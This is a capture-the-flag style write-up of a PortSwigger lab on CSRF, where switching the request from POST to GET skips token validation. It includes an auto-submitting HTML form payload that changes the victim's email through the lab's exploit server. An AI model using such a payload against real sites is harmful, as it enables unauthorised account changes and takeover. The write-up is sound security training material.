### CSRF where token validation depends on request method : PRACTITIONER

---

Given credentials `wiener:peter`, we need to create a CSRF attack to change the email of the victim user.

Logging in with the given credentials.

![](./screenshots/lab1-1.png)

We see this page.

![](./screenshots/lab1-2.png)

We know that the update email is vulnerable to CSRF.
- Capturing a `POST` request via BURPSUITE PROXY HTTP history while updating the email address.

![](./screenshots/lab2-1.png)

There is a `csrf` token.
- Trying to play with it doesn't work.

![](./screenshots/lab2-4.png)

We can try to change the type of request method to `GET` and see if the `csrf` parameter is not verified.

![](./screenshots/lab2-2.png)

![](./screenshots/lab2-3.png)

> Now if we try to modify or delete the token, the request works fine.

![](./screenshots/lab2-5.png)

This request shows that there is a CSRF vulnerability as there is an action we can exploit, use session cookies to identify users, and no hidden parameters that are hard to guess (CSRF token).

- Creating the HTML payload similar to [[Portswigger/CSRF/Lab 1|Lab 1]]:
``` HTMl
<html> 
	<body> 
		<form action="https://https://0af400c304930cd481218a8d00d70008.web-security-academy.net/my-account/change-email" method="GET"> 
			<input type="hidden" name="email" value="mins3@mins.com" /> 
		</form> 
		<script> document.forms[0].submit(); </script> 
	</body> 
</html>
```

Heading to exploits server and adding it in the body.

![](./screenshots/lab2-6.png)

Delivering the exploit to victim and then refreshing the my-account page, we see that we updated the email to the one we entered.

---
